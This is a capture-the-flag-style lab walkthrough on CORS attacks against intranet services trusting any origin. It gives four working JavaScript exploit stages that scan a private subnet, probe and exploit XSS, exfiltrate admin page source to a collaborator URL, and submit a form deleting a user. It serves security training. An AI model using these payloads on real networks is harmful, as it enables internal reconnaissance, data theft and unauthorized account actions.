Most CORS attack rely on the presence of `Access-Control-Allow-Credentials: true` response header.

Without that header, the victim's user browser will refuse to send cookies. However, there is a common situation where an attacker can't access a website directly, and that is, when the website is part of the organization's intranet and located within a private IP address space.

Internal website or applications are often held to a lower security standards, enabling attackers to find vulnerabilities and gain further access. For example, a CORS request within a private network may be as follows:
```http
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```
And the server responds with:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```
The response indicates that the server accepts resource request from any origin without credentials. If users within the private IP address space access the public internet then a CORS-based attack can be performed from the external site that uses the victim's browser as a proxy for accessing intranet resources.
## Example Exploit
1. First we need to scan the local network for the endpoint. Replace `$collaboratorPayload` with your own Collaborator payload or exploit server URL. Enter the following code into the exploit server. Click store then "Deliver exploit to victim". Inspect the log or the Collaborator interaction and look at the code parameter sent to it.
> Note: If Burp Collaborator is not available, we can use [CanaryTokens](https://canarytokens.org/generate#) and [interactsh](https://github.com/projectdiscovery/interactsh) as alternatives.
```html
<script>
var q = [], collaboratorURL = 'http://$collaboratorPayload';

for(i=1;i<=255;i++) {
	q.push(function(url) {
		return function(wait) {
			fetchUrl(url, wait);
		}
	}('http://192.168.0.'+i+':8080'));
}

for(i=1;i<=20;i++){
	if(q.length)q.shift()(i*100);
}

function fetchUrl(url, wait) {
	var controller = new AbortController(), signal = controller.signal;
	fetch(url, {signal}).then(r => r.text().then(text => {
		location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
	}))
	.catch(e => {
		if(q.length) {
			q.shift()(wait);
		}
	});
	setTimeout(x => {
		controller.abort();
		if(q.length) {
			q.shift()(wait);
		}
	}, wait);
}
</script>
```
2. Clear the code from stage 1 and enter the following code in the exploit server. Replace `$ip` with the IP address and port number retrieved from your collaborator interaction. Don't forget to add your Collaborator payload or exploit server URL again. Update and deliver your exploit. We will now probe the username field for an XSS vulnerability. You should retrieve a Collaborator interaction with `foundXSS=1` in the URL or you will see `foundXSS=1` in the log.
```html
<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r => r.text().then(text => {
		xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
	}))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>
```
3. Clear the code from stage 2 and enter the following code in the exploit server. Replace `$ip` with the same IP address and port number as in step 2 and don't forget to add your Collaborator payload or exploit server again. Update and deliver your exploit. Your Collaborator interaction or your exploit server log should now give you the source code of the admin page.
```html
<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r=>r.text().then(text=>
	{
		xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
	}
	))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>
```
4. Read the source code retrieved from step 3 in your Collaborator interaction or on the exploit server log. You'll notice there's a form that allows you to delete a user. Clear the code from stage 3 and enter the following code in the exploit server. Replace `$ip` with the same IP address and port number as in steps 2 and 3. The code submits the form to delete `carlos` by injecting an iframe pointing to the `/admin` page.
```html
<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url){
	fetch(url).then(r=>r.text().then(text=>
	{
	xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
	}
	))
}

fetchUrl("http://$ip");
</script>
```
5. Click on "Deliver exploit to victim" to submit the code. Once you have submitted the form to delete `carlos` then you have completed the lab.
